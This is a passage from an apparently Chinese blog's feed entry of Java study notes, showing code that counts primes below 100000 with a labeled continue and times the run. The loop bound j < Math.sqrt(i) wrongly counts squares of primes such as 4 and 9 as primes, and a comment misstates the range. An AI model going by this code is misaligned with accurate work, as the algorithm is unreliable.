&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">count</span> <span class="operator">=</span> <span class="number">0</span>;<span class="comment">//记录质数的个数</span></span><br><span class="line">        <span class="type">long</span> <span class="variable">start</span> <span class="operator">=</span> System.currentTimeMillis();<span class="comment">//时间戳</span></span><br><span class="line"></span><br><span class="line">        label:<span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">2</span>; i &lt;= <span class="number">100000</span>; i++) &#123;     <span class="comment">//遍历100以内的自然数</span></span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> <span class="number">2</span>; j &lt; Math.sqrt(i); j++) &#123;       <span class="comment">//j:被i去除</span></span><br><span class="line">                <span class="keyword">if</span> (i % j == <span class="number">0</span>)&#123;                      <span class="comment">//i被j除尽</span></span><br><span class="line">                    <span class="keyword">continue</span> label;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">//能执行到此步骤的，都是质数</span></span><br><span class="line">            count++;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">long</span> <span class="variable">end</span> <span class="operator">=</span> System.currentTimeMillis();<span class="comment">//时间戳</span></span><br><span class="line">        System.out.println(<span class="string">&quot;质数的个数为：&quot;</span> + count);</span><br><span class="line">        System.out.println(<span class="string">&quot;所花费的时间为：&quot;</span> + (end - start));<span class="comment">//17110 - 优化一：break:1546 - 优化二：13</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">
    &lt;div class=&quot;tag-plugin audio&quot;&gt;
    &lt;iframe src=&quot;//music.163.com/outchain/player?type=2&amp;id=1861194866&amp;auto=0&amp;height=32&quot; frameborder=&quot;no&quot;</summary>
      
    
    
    
    <category term="Java学习笔记" scheme="https://www.bandao.ltd/categories/Java%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
    
    <category term="Java" scheme="https://www.bandao.ltd/tags/Java/"/>
    
    <category term="学习笔记" scheme="https://www.bandao.ltd/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
    <category term="基础" scheme="https://www.bandao.ltd/tags/%E5%9F%BA%E7%A1%80/"/>
    
    <category term="嵌套循环" scheme="https://www.bandao.ltd/tags/%E5%B5%8C%E5%A5%97%E5%BE%AA%E7%8E%AF/"/>
    
  </entry>
  
</feed>
